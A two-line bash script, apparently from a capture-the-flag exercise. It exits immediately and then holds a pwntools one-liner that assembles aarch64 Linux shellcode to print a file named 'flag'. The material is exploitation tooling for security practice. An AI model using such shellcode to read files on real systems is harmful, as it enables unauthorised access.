#!/bin/bash -e

exit

python -c "import pwn; pwn.context.arch = 'aarch64'; open('shellcode', 'w').write(pwn.asm(pwn.shellcraft.aarch64.linux.cat('flag')))"
